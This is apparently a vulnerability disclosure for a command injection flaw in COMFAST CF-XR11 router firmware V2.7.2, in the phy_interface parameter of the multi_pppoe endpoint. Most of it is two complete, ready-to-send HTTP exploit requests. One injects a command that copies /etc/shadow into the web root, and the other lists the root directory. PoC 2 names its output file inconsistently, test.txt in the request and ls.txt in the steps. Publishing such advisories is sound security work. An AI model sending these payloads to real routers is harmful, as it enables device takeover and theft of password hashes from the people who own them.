# COMFAST CF-XR11 V2.7.2 Command Injection in `multi_pppoe`

## Overview
A command injection vulnerability exists in the COMFAST CF-XR11 (firmware V2.7.2) in the `multi_pppoe` API (`/usr/bin/webmgnt`, function `sub_423930`). Attackers can inject arbitrary commands via the `phy_interface` parameter in a POST request to `/cgi-bin/mbox-config?method=SET&section=multi_pppoe`, enabling unauthorized access or full device compromise.

## Details
- **Product**: COMFAST CF-XR11
- **Firmware**: V2.7.2
- **Endpoint**: `/cgi-bin/mbox-config?method=SET&section=multi_pppoe`
- **Vulnerability**: Command Injection
- **CVE ID**: Pending
- **Impact**: Execute arbitrary commands, access sensitive files, or gain full control.

### Description
The `phy_interface` parameter is unsanitized and used in a `system` call (`sprintf(v78, "ifdown %s; ifup %s", v76, v76)`). When `action` is set to `"one_click_redial"`, malicious input in `phy_interface` (e.g., `br-wan && cat /etc/shadow > /www-comfast/test.txt`) executes arbitrary commands.

## Proof of Concept (PoC)

### PoC 1: Dump `/etc/shadow`
```http
POST /cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
Host: cflogin.cn
Content-Length: 110
Content-Type: application/json
Cookie: COMFAST_SESSIONID=6501a8c0-ffffffc40f08ffffffaaffffff82fffffff0-2c28fa16
Connection: close

{
  "action": "one_click_redial",
  "phy_interface": "br-wan && cat /etc/shadow > /www-comfast/test.txt",
  "real_num": 1
}
```

- **Steps**:
  1. Send the request using `curl` or Burp Suite.
  2. Access `http://cflogin.cn/test.txt` to view `/etc/shadow`.
- **Result**: The `/etc/shadow` file is written to `/www-comfast/test.txt`.

![PoC 1 Result: /etc/shadow Output](./images/poc1_shadow_output.png)

### PoC 2: List Root Directory (`ls /`)
```http
POST /cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
Host: cflogin.cn
Content-Length: 104
Content-Type: application/json
Cookie: COMFAST_SESSIONID=6501a8c0-ffffffc40f08ffffffaaffffff82fffffff0-2c28fa16
Connection: close

{
  "action": "one_click_redial",
  "phy_interface": "br-wan && ls / > /www-comfast/test.txt",
  "real_num": 1
}
```

- **Steps**:
  1. Send the request.
  2. Access `http://cflogin.cn/ls.txt` to view the root directory listing.
- **Result**: The root directory listing is written to `/www-comfast/ls.txt`.

![PoC 2 Result: Root Directory Listing](./imgs/5.png)

## Affected Versions
- COMFAST CF-XR11 V2.7.2